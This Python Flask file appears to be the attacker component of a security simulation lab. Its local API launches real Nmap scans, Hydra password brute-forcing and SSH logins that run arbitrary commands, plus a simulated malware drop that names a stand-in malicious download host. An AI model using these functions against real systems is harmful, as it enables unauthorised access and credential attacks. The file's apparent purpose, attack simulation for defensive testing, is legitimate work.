# security-sim-project/scripts/attacker_agent.py
from flask import Flask, request, jsonify
import subprocess
import threading
import os
import time
import nmap # Richiede 'python-nmap'
import paramiko # Richiede 'paramiko'
import random # Per simulazioni

app = Flask(__name__)

# Funzioni per gli attacchi (precedentemente definite)
def run_nmap_scan(target_ip, scan_type, ports):
    """Esegue una scansione Nmap."""
    print(f"Esecuzione Nmap {scan_type} su {target_ip} porte {ports}")
    try:
        # Usiamo sudo per permettere scansioni raw come -sS
        result = subprocess.run(['nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True)
        print("Nmap Scan Output:\n", result.stdout)
        return {"status": "success", "output": result.stdout, "error": result.stderr}
    except subprocess.CalledProcessError as e:
        print(f"Nmap Error: {e.stderr}")
        return {"status": "error", "message": f"Nmap failed: {e.stderr}"}
    except FileNotFoundError:
        return {"status": "error", "message": "Nmap non trovato. Assicurati che sia installato e nel PATH."}

def run_hydra_bruteforce(target_ip, service, username_list, password_list):
    """Esegue un attacco brute-force con Hydra."""
    print(f"Esecuzione Hydra brute-force su {target_ip} per servizio {service}")
    # Creazione file temporanei per liste username/password
    
    if not username_list or not password_list:
        return {"status": "error", "message": "Username e password list non possono essere vuote."}
    
    user_file = "/tmp/hydra_users.txt"
    pass_file = "/tmp/hydra_pass.txt"
    with open(user_file, "w") as f:
        f.write("\n".join(username_list))
    with open(pass_file, "w") as f:
        f.write("\n".join(password_list))

    try:
        # Usiamo sudo per hydra se necessario (dipende dalle configurazioni di Hydra)
        result = subprocess.run(['hydra', '-L', user_file, '-P', pass_file, target_ip, service], capture_output=True, text=True, check=True, timeout=120)
        print("Hydra Brute-Force Output:\n", result.stdout)
        return {"status": "success", "output": result.stdout, "error": result.stderr}
    except subprocess.CalledProcessError as e:
        print(f"Hydra Error: {e.stderr}")
        return {"status": "error", "message": f"Hydra failed: {e.stderr}"}
    except subprocess.TimeoutExpired as e:
        print(f"Hydra Timeout: {e}")
        return {"status": "error", "message": "Hydra execution timed out."}
    except FileNotFoundError:
        return {"status": "error", "message": "Hydra non trovato. Assicurati che sia installato e nel PATH."}
    except Exception as e:
        print(f"Errore durante l'esecuzione di Hydra: {e}")
        return {"status": "error", "message": f"Errore durante l'esecuzione di Hydra: {str(e)}"}
    finally:
        # Pulizia file temporanei
        if os.path.exists(user_file): os.remove(user_file)
        if os.path.exists(pass_file): os.remove(pass_file)

def simulate_lateral_movement_ssh(target_ip, username, password, command):
    """Simula un movimento laterale via SSH."""
    print(f"Simulazione movimento laterale via SSH su {target_ip} come {username}")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=target_ip, username=username, password=password, timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        client.close()
        print(f"SSH Command Output: {output}")
        if error:
            print(f"SSH Command Error: {error}")
            return {"status": "error", "message": f"SSH command failed: {error}"}
        return {"status": "success", "output": output}
    except paramiko.AuthenticationException:
        return {"status": "error", "message": "Autenticazione SSH fallita. Credenziali errate."}
    except paramiko.SSHException as e:
        return {"status": "error", "message": f"Errore SSH: {str(e)}"}
    except Exception as e:
        print(f"Errore generico durante SSH: {e}")
        return {"status": "error", "message": f"Errore generico durante SSH: {str(e)}"}

def simulate_malware_drop(target_ip, malware_url="http://malicious.example.com/malware.exe"):
    """Simula il download di un malware dal target."""
    print(f"Simulazione di malware drop su {target_ip} da {malware_url}")
    # In uno scenario reale, useresti curl/wget sulla macchina target o simuleresti un download
    # Per questa simulazione, possiamo semplicemente registrare l'evento
    try:
        # Potresti tentare una connessione HTTP/S per simulare il download
        # response = requests.get(malware_url, timeout=5)
        # if response.status_code == 200:
        #     print(f"Simulato download riuscito di {len(response.content)} bytes.")
        #     return {"status": "success", "message": "Malware drop simulato con successo."}
        # else:
        #     return {"status": "error", "message": f"Simulato download fallito, Status: {response.status_code}"}

        # Per una simulazione più semplice che non richiede un server malevolo esterno:
        # Si simula l'interazione con la macchina target per "piazzare" il malware.
        # Questo può essere fatto via SSH (se è un attacco che segue il lateral movement)
        # o semplicemente registrando l'evento.
        # Ad esempio, potresti tentare di creare un file nella directory /tmp del target via SSH
        # Usando paramiko come sopra per lateral_movement_ssh:
        # client = paramiko.SSHClient()
        # client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # client.connect(hostname=target_ip, username='someuser', password='somepassword', timeout=10)
        # stdin, stdout, stderr = client.exec_command(f"echo 'malicious_content' > /tmp/malware.exe")
        # client.close()
        print(f"Simulato tentativo di drop di malware su {target_ip}.")
        return {"status": "success", "message": f"Malware drop simulato su {target_ip} con URL: {malware_url}. Nessun file reale trasferito."}
    except Exception as e:
        print(f"Errore durante la simulazione di malware drop: {e}")
        return {"status": "error", "message": f"Errore simulazione malware drop: {str(e)}"}


# API Endpoints
@app.route('/attack', methods=['POST'])
def handle_attack():
    data = request.json
    attack_type = data.get('attack_type')
    target_ip = data.get('target_ip')
    params = data.get('params', {})

    if not attack_type or not target_ip:
        return jsonify({"status": "error", "message": "Tipo di attacco e IP target sono richiesti."}), 400

    print(f"Received attack request: {attack_type} on {target_ip} with params {params}")

    def run_attack_wrapper(attack_func, *func_args):
        """
        Funzione wrapper per eseguire la funzione di attacco in un thread
        e gestire il logging del risultato.
        """
        try:
            result = attack_func(*func_args)
            print(f"Attack completed with result: {result}")
        except Exception as e:
            print(f"Errore durante l'esecuzione dell'attacco {attack_func.__name__}: {e}")
            # Potresti loggare l'errore in un file o un sistema di monitoraggio

    # Dizionario che mappa i tipi di attacco alle funzioni e ai loro argomenti
    attack_handlers = {
        "port_scan": {
            "func": run_nmap_scan,
            "args": (target_ip, params.get('scan_type', '-sS'), params.get('ports', '1-1000')),
            "message": f"Port scan avviato su {target_ip}"
        },
        "brute_force": {
            "func": run_hydra_bruteforce,
            "args": (
                target_ip,
                params.get('service', 'ssh'),
                [u.strip() for u in params.get('username_list', '').split(',') if u.strip()] if isinstance(params.get('username_list'), str) else params.get('username_list', []),
                [p.strip() for p in params.get('password_list', '').split(',') if p.strip()] if isinstance(params.get('password_list'), str) else params.get('password_list', [])
            ),
            "message": f"Brute force avviato su {target_ip}"
        },
        "lateral_movement_ssh": {
            "func": simulate_lateral_movement_ssh,
            "args": (target_ip, params.get('username'), params.get('password'), params.get('command')),
            "message": f"Lateral movement via SSH avviato su {target_ip}"
        },
        "malware_drop": {
            "func": simulate_malware_drop,
            "args": (target_ip, params.get('malware_url')),
            "message": f"Malware drop simulato su {target_ip}"
        }
    }

    handler = attack_handlers.get(attack_type)

    if handler:
        threading.Thread(target=run_attack_wrapper, args=(handler["func"], *handler["args"])).start()
        return jsonify({"status": "accepted", "message": handler["message"]})
    else:
        return jsonify({"status": "error", "message": "Tipo di attacco non supportato."}), 400
@app.route('/status', methods=['GET'])
def get_status():
    return jsonify({"status": "Attacker Agent running", "timestamp": time.time()})

if __name__ == '__main__':
    # Agente attaccante sulla porta 5001, accessibile solo da localhost (orchestrator)
    app.run(host='127.0.0.1', port=5001)